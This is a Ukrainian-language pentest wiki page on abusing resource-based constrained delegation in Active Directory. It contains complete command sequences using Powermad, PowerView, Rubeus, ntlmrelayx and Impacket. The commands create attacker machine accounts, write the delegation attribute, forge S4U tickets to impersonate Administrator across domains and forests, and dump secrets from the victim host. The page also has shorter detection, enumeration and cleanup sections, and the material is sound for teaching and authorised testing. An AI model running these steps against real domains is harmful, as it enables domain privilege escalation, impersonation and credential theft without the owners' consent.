# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Основи Resource-based Constrained Delegation

Resource-based constrained delegation (RBCD) подібна до [constrained delegation](constrained-delegation.md), але напрямок довіри протилежний. У традиційній constrained delegation фіксується, до яких служб може делегувати principal; у RBCD на **цільовому ресурсі** фіксується, які principals можуть видавати себе за користувачів для доступу до нього.<sup>[[12]](#references)</sup>

Атрибут цільового об’єкта _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ містить дескриптор безпеки, який визначає principals, яким дозволено діяти від імені інших ідентичностей для цього ресурсу.

Ще одна важлива відмінність: principal із достатніми **правами на запис до облікового запису комп’ютера** (`GenericAll`, `GenericWrite`, `WriteDacl`, `WriteProperty` та подібними правами) може мати змогу змінити _**msDS-AllowedToActOnBehalfOfOtherIdentity**_. Налаштування традиційної constrained delegation зазвичай потребує привілейованішого адміністративного доступу.<sup>[[1]](#references)</sup>

Точніше, змінення класичних параметрів constrained delegation зазвичай вимагає права `SeEnableDelegationPrivilege` на контролері домену — права, яке зазвичай мають високо привілейовані адміністратори. У RBCD рішення визначається дескриптором безпеки цільового об’єкта, тому прав на запис до відповідної властивості об’єкта комп’ютера може бути достатньо без цього права користувача.<sup>[[1]](#references)[[2]](#references)</sup>

### Нові поняття

Прапорець **`TrustedToAuthForDelegation`** у `userAccountControl` часто описують як передумову для **S4U2Self**, але це не зовсім так.\
Service principal із SPN може запитувати S4U2Self і без цього прапорця. Якщо встановлено `TrustedToAuthForDelegation`, повернений service ticket буде **forwardable**; без нього ticket зазвичай **non-forwardable**.<sup>[[5]](#references)</sup>

Традиційна constrained delegation відхиляє **non-forwardable TGS** на етапі S4U2Proxy. RBCD може прийняти цей ticket S4U2Self, якщо дескриптор безпеки цільового об’єкта надає дозвіл службі, що надсилає запит.<sup>[[1]](#references)[[2]](#references)[[16]](#references)</sup>

### Структура атаки

> Якщо у вас є **права, еквівалентні правам на запис**, до **облікового запису комп’ютера**, ви можете отримати привілейований доступ до цієї машини.

Припустімо, що зловмисник уже має **права, еквівалентні правам на запис, до об’єкта комп’ютера-жертви**.

1. Зловмисник **компрометує** обліковий запис зі **SPN** або **створює такий обліковий запис** («Service A»). За замовчуванням автентифікований користувач домену може створити до 10 об’єктів комп’ютерів; це обмеження задає **_MachineAccountQuota_**. Об’єкт комп’ютера автоматично надає придатні для використання SPN.
2. Зловмисник **зловживає своїм правом WRITE** щодо комп’ютера-жертви (ServiceB), щоб налаштувати **resource-based constrained delegation і дозволити ServiceA видавати себе за будь-якого користувача** під час доступу до цього комп’ютера-жертви (ServiceB).
3. Зловмисник використовує Rubeus для виконання **повної S4U-атаки** (S4U2Self і S4U2Proxy) від Service A до Service B від імені користувача, **який має привілейований доступ до Service B**.
   1. S4U2Self (з компрометованого або створеного облікового запису зі SPN): запросити **TGS, що представляє Administrator для Service A** (non-forwardable).
   2. S4U2Proxy: використати цей **non-forwardable TGS**, щоб запросити service ticket, який представляє **Administrator** для **хоста-жертви**.
   3. Non-forwardable ticket усе одно може спрацювати в цьому потоці RBCD, оскільки Service A має дозвіл у дескрипторі безпеки цільового ресурсу.
4. Зловмисник може виконати **pass-the-ticket** і **видати себе за** користувача, щоб отримати **доступ до ServiceB-жертви**.<sup>[[1]](#references)</sup>

`MachineAccountQuota=0` закриває стандартний шлях створення об’єктів комп’ютерів, але не скасовує права на запис до цільового об’єкта комп’ютера чи контроль над наявним обліковим записом. Іноді як principal для делегування можна використати контрольований звичайний обліковий запис користувача без SPN за допомогою [методу U2U без SPN](#spn-less-cross-domain--cross-forest-rbcd), зокрема в межах одного домену. Для цього шляху все одно потрібні ефективне право запису RBCD, контроль над обліковими даними користувача, що делегує, ідентичність, яку дозволено делегувати, сумісна поведінка шифрування Kerberos і зміна NT-хешу, що порушує роботу облікового запису. Розглядайте ці умови як окремі передумови: самі лише порожній атрибут RBCD або нульова квота не доводять ні можливості атаки, ні безпечності.

Наявний дескриптор RBCD також може вказувати на **групу**, а не безпосередньо на комп’ютер, що делегує. Якщо ви контролюєте обліковий запис комп’ютера зі SPN і можете додати його до цієї групи, нове членство може забезпечити шлях делегування без зміни атрибута RBCD цільового комп’ютера. Перш ніж робити висновок, що цей шлях працює, перевірте ефективний ACL групи для зміни членства (зокрема ACE із забороною), вкладене членство й оновлення токена, SID trustee у дескрипторі, обмеження делегування для облікового запису, за якого видають себе, та SPN цільової служби.

Щоб перевірити _**MachineAccountQuota**_ домену, можна скористатися:

```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```

## Атака

### Створення об’єкта комп’ютера

Ви можете створити об’єкт комп’ютера в домені за допомогою **[powermad](https://github.com/Kevin-Robertson/Powermad):**<sup>[[3]](#references)[[4]](#references)</sup>

```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```

### Налаштування делегування з обмеженням на основі ресурсів

**Використання модуля Active Directory PowerShell**<sup>[[4]](#references)</sup>

```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assign delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```

**Використання powerview**<sup>[[3]](#references)</sup>

```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```

### Виконання повної S4U attack (Windows/Rubeus)

Насамперед ми створили новий об’єкт Computer із паролем `123456`, тому нам потрібен хеш цього пароля:<sup>[[3]](#references)[[4]](#references)</sup>

```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```

Це виведе хеші RC4 та AES для цього облікового запису.\
Тепер атаку можна виконати:<sup>[[3]](#references)[[4]](#references)</sup>

```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```

Можна згенерувати більше квитків для інших служб, просто попросивши один раз за допомогою параметра `/altservice` у Rubeus:

```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```

> [!CAUTION]
> Користувачів можна позначити як **"Account is sensitive and cannot be delegated."** Якщо цей прапорець увімкнено, цей обліковий запис не можна імітувати через цей сценарій делегування. BloodHound показує цю властивість під час аналізу.

### Інструменти Linux: наскрізний RBCD за допомогою Impacket (2024+)

Якщо ви працюєте з Linux, можна виконати весь ланцюжок RBCD за допомогою офіційних інструментів Impacket:<sup>[[6]](#references)[[7]](#references)</sup>

```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```

Нотатки
- Якщо ввімкнено підписування LDAP/LDAPS, використовуйте `impacket-rbcd -use-ldaps ...`.
- Віддавайте перевагу ключам AES; у багатьох сучасних доменах RC4 обмежено. Impacket і Rubeus підтримують сценарії лише з AES.
- Impacket може переписувати `sname` («AnySPN») для деяких інструментів, але за можливості отримуйте правильний SPN (наприклад, CIFS/LDAP/HTTP/HOST/MSSQLSvc).

## RBCD між доменами та лісами

Якщо контрольований вами **делегувальний principal** розташований в **іншому домені** (або навіть **іншому лісі**), ніж **комп’ютер-ресурс**, зловживання все ще є **RBCD**, але потік квитків уже не відповідає звичному однодоменному сценарію `S4U2Self -> S4U2Proxy`.

### RBCD між доменами: налаштування foreign principal за SID

Якщо ви задаєте `msDS-AllowedToActOnBehalfOfOtherIdentity` з **іншого домену**, foreign machine/user може **не визначатися за ім’ям** у LDAP цільового домену. У такому разі налаштуйте запис делегування, використовуючи **SID** foreign principal замість його sAMAccountName/UPN.

Це особливо актуально під час ретрансляції NTLM до LDAP за допомогою `ntlmrelayx.py`:<sup>[[9]](#references)</sup>

```bash
sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
  --no-dump --no-da --no-validate-privs \
  --delegate-access \
  --escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
  --sid
```

Примітки:
- `--sid` вказує `ntlmrelayx.py` трактувати `--escalate-user` як SID. Це потрібно, коли обліковий запис, що делегує, належить до іншого домену, ніж цільовий.
- Навіть якщо інструмент виводить `User not found in LDAP`, запис делегування все одно може бути успішним, оскільки дескриптор безпеки зберігає SID зовнішнього принципала безпосередньо.

### RBCD між доменами: послідовність S4U між realm

Після додавання зовнішнього принципала до `msDS-AllowedToActOnBehalfOfOtherIdentity` робочий процес між доменами такий:<sup>[[9]](#references)[[13]](#references)</sup>

1. Отримайте **TGT** для принципала, що делегує, у його власному домені.
2. Запросіть **TGT перенаправлення** для `krbtgt/<target-domain>`.
3. Запросіть **перенаправлення S4U2Self між realm** для користувача, якого потрібно імперсонувати, на контролері домену цільового домену.
4. Запросіть фактичний квиток **S4U2Self** для цього користувача у домені делегувального принципала.
5. Виконайте **S4U2Proxy** у домені делегувального принципала, щоб отримати квиток перенаправлення для цільового домену.
6. Виконайте фінальний **S4U2Proxy** на контролері домену цільового домену, щоб отримати квиток служби для `cifs/host.target`, `host/host.target` тощо.

Саме тому стандартні інструменти Linux часто не працюють із RBCD між доменами:<sup>[[9]](#references)</sup>
- **realm** запиту може відрізнятися від realm TGT, використаного в `TGS-REQ`
- ланцюжок має містити **окремі кроки S4U2Proxy**, а не лише `S4U2Self` або `S4U2Self`, одразу за яким іде один `S4U2Proxy`

### RBCD між доменами з Linux

Synacktiv опублікували реалізацію `getST.py` для Impacket, яка відтворює послідовність між realm у Linux, явно обробляючи обидва KDC:<sup>[[9]](#references)[[11]](#references)</sup>

```bash
python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
  -dc-ip 192.168.90.131 \
  -targetdc 192.168.90.217 \
  -targetdomain asgard.local \
  -impersonate thor_adm \
  -spn cifs/workstation.asgard.local

KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
  ./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
  -k -no-pass -dc-ip 192.168.90.217
```

Операційно нові аргументи такі:
- `-dc-ip`: DC домену, що **делегує**
- `-targetdomain`: домен **комп’ютера-ресурсу**
- `-targetdc`: DC домену **ресурсу**

### Обмеження міжлісового RBCD

У міжлісового RBCD є важливе обмеження: **користувач, від імені якого виконується імперсоналізація, має належати до того самого лісу, що й principal, який делегує**. Іншими словами, якщо контрольований вами обліковий запис комп’ютера належить до `valhalla.local`, а цільовий ресурс — до `asgard.local`, зазвичай ви **не зможете** імперсоналізувати довільних користувачів `asgard.local` для доступу до цього ресурсу через RBCD.<sup>[[9]](#references)</sup>

Експлуатація все ще можлива, якщо:
- користувач із **лісу, що делегує**, є **локальним адміністратором** (або має інші привілеї) на хості ресурсу в іншому лісі
- trust забезпечує необхідний шлях автентифікації, а foreign SID приймається в дескрипторі безпеки цільового комп’ютера

### Особливості протоколу міжлісового RBCD

Міжлісовий RBCD — це не просто «міждоменний RBCD плюс trust». У спостережуваному потоці є дві особливості, які традиційно не враховують поширені інструменти:<sup>[[9]](#references)</sup>

1. Додатковий запит **S4U2Proxy**, у якому встановлено **`PA-PAC-OPTIONS=branch-aware`**
2. Квиток служби на завершальному етапі може повертатися з використанням **RC4**, навіть якщо було запитано інші типи шифрування

Практичний потік:

1. Отримайте TGT для principal, що делегує, у лісі A.
2. Запитайте **S4U2Self** для користувача, від імені якого виконується імперсоналізація, у лісі A.
3. Запитайте **S4U2Proxy** у лісі A, щоб отримати referral TGT для лісу B.
4. Надішліть другий запит **S4U2Proxy** у лісі A **без** квитка S4U2Self як додаткового квитка, але з увімкненим `branch-aware`, щоб отримати ще один referral TGT для лісу B.
5. За бажанням запитайте звичайний квиток служби в лісі B для principal, що делегує (цей квиток не потрібен для фінальної експлуатації).
6. Використайте referral tickets із кроків 3 і 4, щоб запросити фінальний квиток **S4U2Proxy** у лісі B для користувача з лісу A, від імені якого виконується імперсоналізація, до цільового SPN.

### Міжлісовий RBCD із Linux

Та сама гілка Impacket від Synacktiv додає для цієї логіки перемикач `-forest`:<sup>[[9]](#references)[[11]](#references)</sup>

```bash
python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
  -impersonate 'v_thor' \
  -dc-ip VALHALLA.local \
  valhalla.local/'desktop$' \
  -targetdc ASGARD.local \
  -targetdomain asgard.local \
  -aesKey 4[...]f \
  -forest
```

### Рекурсивний RBCD у кількох доменах (3+ доменів)

У **багатодоменних лісах** і **S4U2Self**, і **S4U2Proxy** можуть виконуватися **рекурсивно**, а не зупинятися після одного перенаправлення:

- **Рекурсивний S4U2Self**: перший запит `S4U2Self` надсилається до **домену користувача, якого імперсонують**; проміжні переходи між батьківськими й дочірніми доменами проходяться за допомогою звичайних перенаправлень `TGS-REQ` для `krbtgt/<REALM>`, а **останній запит `S4U2Self`** надсилається у **власному домені принципала, що делегує**.
- Це означає, що **самого TGT** облікового запису комп’ютера може вистачити, щоб імперсонувати **адміністратора з іншого домену того самого лісу** й запросити `cifs/host`, `host/host`, `wsman/host` тощо.
- **Рекурсивний S4U2Proxy** так само проходить ланцюжком довіри: на проміжних переходах попередній квиток повторно використовується як TGT для запиту наступного перенаправлення `krbtgt/<REALM>`, і лише останній перехід повертає кінцевий квиток служби.<sup>[[10]](#references)</sup>

Практичний приклад у межах одного лісу:

```bash
KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
  -impersonate Administrator@frperso.local -self \
  -altservice cifs/min-frperso-01.minus.sub.frperso.local

KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
  smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
```

### SPN-less міждоменний / міжлісовий RBCD

Якщо **принципал делегування — користувач без SPN**, останній рекурсивний `S4U2Self` завершується помилкою **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**. Обхідний спосіб — **повторити лише останній крок із `S4U2Self+U2U`**.<sup>[[10]](#references)</sup>

Короткий опис ланцюжка зловживання:

1. Автентифікуйтеся за допомогою **NT-хешу**, щоб спрямувати KDC до використання **RC4-HMAC (etype 23)**.
2. Спочатку запросіть **`-self -u2u`** і збережіть цей квиток окремо від подальшого кроку proxy.
3. Витягніть **ключ сеансу TGT** за допомогою `describeTicket.py`.
4. Замініть **NT-хеш** користувача на цей **ключ сеансу** за допомогою `changepasswd.py -newhashes <session_key>`.
5. Повторно використайте квиток `S4U2Self+U2U` як **`-additional-ticket`** під час окремого запиту **`-proxy`**.

```bash
getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
  -impersonate Administrator@frperso.local -self -u2u
describeTicket.py Administrator.ccache
changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
  -hashes ':<nthash>' -newhashes <tgt_session_key>
KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
  -impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
  -spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
```

Operational caveats:

- Якщо **перший довірений перехід уже веде до іншого лісу**, надавайте перевагу алгоритму **branch-aware** (`getST.py ... -forest`), щоб відповідати поведінці Windows за замовчуванням. Якщо до foreign forest веде лише пізніший перехід у ланцюжку, рекурсивний процес без урахування гілок усе ще може спрацювати.<sup>[[9]](#references)</sup>
- На новіших DC під **Windows Server 2022/2025** примусове використання RC4 може завершитися помилкою **`KDC_ERR_ETYPE_NOSUPP`** через застарівання RC4; через це **RBCD без SPN може бути неможливим**, хоча класичний RBCD зі SPN усе ще працює з AES.<sup>[[15]](#references)</sup>
- Виконуйте **`S4U2Self+U2U` до зміни hash/password користувача**: **`SamrChangePasswordUser`** не перераховує AES keys облікового запису Kerberos, тому попередня зміна пароля може порушити подальші запити квитків.<sup>[[14]](#references)</sup>
- Імперсонований обліковий запис усе ще має бути **delegable**: **Protected Users** і облікові записи з **`NOT_DELEGATED`** / **"Account is sensitive and cannot be delegated"** блокують ланцюжок.

## Detection / hardening notes

- Шляхи RBCD між доменами/лісами зазвичай і далі створюються через **зловживання ACL** або **relay-to-LDAP**. Увімкніть **LDAP signing** і **LDAP channel binding** на DC, щоб перекрити поширені способи налаштування.
- Перевіряйте, хто може записувати `msDS-AllowedToActOnBehalfOfOtherIdentity` в об’єкти комп’ютерів, і визначайте, кому відповідають збережені SID, зокрема **foreign security principals**.
- У середовищах із багатьма trust-зв’язками перевірте **Selective Authentication**, **SID filtering** і наявність у користувачів із foreign forest прав **local admin** на хостах ресурсів.

### Accessing

Останній командний рядок виконає **повну S4U-атаку та інжектує TGS** від Administrator до хоста-жертви в **пам’ять**.\
У цьому прикладі було запитано TGS для служби **CIFS** від Administrator, тож ви зможете отримати доступ до **C$**:

```bash
ls \\victim.domain.local\C$
```

### Зловживання різними service tickets

Дізнайтеся про [**доступні service tickets тут**](silver-ticket.md#available-services).

## Перерахування, аудит і очищення

### Перерахування комп’ютерів із налаштованим RBCD

PowerShell (декодування SD для визначення SID):

```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
  Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
  ForEach-Object {
    $raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
    $sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
    $sd.DiscretionaryAcl | ForEach-Object {
      $sid  = $_.SecurityIdentifier
      try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
      [PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
    }
  }
```

Impacket (прочитати або очистити однією командою):

```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```

### Очищення / скидання RBCD

- PowerShell (очистити атрибут):

```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```

- Impacket:

```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```

## Помилки Kerberos

- **`KDC_ERR_ETYPE_NOTSUPP`**: Це означає, що Kerberos налаштовано не використовувати DES або RC4, а ви надаєте лише хеш RC4. Надайте Rubeus щонайменше хеш AES256 (або просто надайте хеші rc4, aes128 і aes256). Приклад: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** під час `-self` для звичайного користувача: ймовірно, у принципала, що делегує, **немає SPN**. Спробуйте повторити **останній перехід** як **`S4U2Self+U2U`** замість звичайного `S4U2Self`.<sup>[[10]](#references)</sup>
- **`KDC_ERR_ETYPE_NOSUPP`** під час **SPN-less RBCD**: нові DC можуть відхиляти примусовий шлях **RC4-HMAC**, потрібний для трюку з `S4U2Self+U2U` і підміною ключа сеансу. Натомість спробуйте класичний шлях **SPN-backed RBCD** з AES.<sup>[[10]](#references)[[15]](#references)</sup>
- **`KRB_AP_ERR_SKEW`**: Це означає, що час на поточному комп’ютері відрізняється від часу на DC, через що Kerberos працює неправильно.
- **`preauth_failed`**: Це означає, що вказані ім’я користувача й хеші не працюють для входу. Можливо, ви забули додати "$" до імені користувача під час генерації хешів (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: Це може означати, що:
  - Користувач, якого ви намагаєтеся імперсонувати, не має доступу до потрібної служби (оскільки ви не можете його імперсонувати або він не має достатніх привілеїв)
  - Запитана служба не існує (якщо ви запитуєте квиток для winrm, але winrm не запущено)
  - Створений fakecomputer втратив свої привілеї на вразливому сервері, і їх потрібно повернути.
  - Ви зловживаєте класичним KCD; пам’ятайте, що RBCD працює з нефорвардними квитками S4U2Self, тоді як для KCD потрібні форвардні.

## Примітки, relay-атаки та альтернативи

- Також можна записати RBCD SD через AD Web Services (ADWS), якщо LDAP фільтрується. Дивіться:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Ланцюжки relay-атак Kerberos часто завершуються на RBCD, щоб за один крок отримати локальний SYSTEM. Дивіться практичні приклади від початку до кінця:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- Якщо підписування LDAP і прив’язування каналу **вимкнені**, а ви можете створити обліковий запис комп’ютера, такі інструменти, як **KrbRelayUp**, можуть перенаправити примусову автентифікацію Kerberos до LDAP, встановити `msDS-AllowedToActOnBehalfOfOtherIdentity` для облікового запису вашого комп’ютера в об’єкті цільового комп’ютера та відразу імперсонувати **Administrator** через S4U з іншого хоста.<sup>[[8]](#references)</sup>

## References

- [1] [Як собака виляє хвостом: зловживання делегуванням з обмеженнями на основі ресурсів для атак на Active Directory](https://eladshamir.com/2019/01/28/Wagging-the-Dog.html)
- [2] [Ще кілька слів про делегування – harmj0y](https://blog.harmj0y.net/redteaming/another-word-on-delegation/)
- [3] [Делегування Kerberos з обмеженнями на основі ресурсів: захоплення об’єкта комп’ютера](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [4] [Netwrix – зловживання делегуванням з обмеженнями на основі ресурсів](https://netwrix.com/en/resources/blog/resource-based-constrained-delegation-abuse/)
- [5] [Kerberosity знищила домен: огляд атак на Kerberos](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [6] [Impacket rbcd.py (офіційний)](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
- [7] [Коротка шпаргалка для Linux з актуальним синтаксисом](https://tldrbins.github.io/rbcd/)
- [8] [0xdf – HTB Bruno (підписування LDAP вимкнено → relay Kerberos до RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [9] [Synacktiv – дослідження RBCD між доменами та лісами](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
- [10] [Synacktiv – дослідження RBCD між доменами та лісами: частина 2](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
- [11] [Гілка Impacket від Synacktiv – cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
- [12] [Microsoft Learn – огляд делегування Kerberos з обмеженнями](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [13] [Специфікації Microsoft Open – S4U2Self між доменами](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
- [14] [Специфікації Microsoft Open – SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
- [15] [Microsoft Learn – виявлення та усунення використання RC4 у Kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)
- [16] [Специфікації Microsoft Open – подробиці S4U2Proxy](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/bde93b0e-f3c9-4ddf-9cd5-e9c237331c90)
{{#include ../../banners/hacktricks-training.md}}
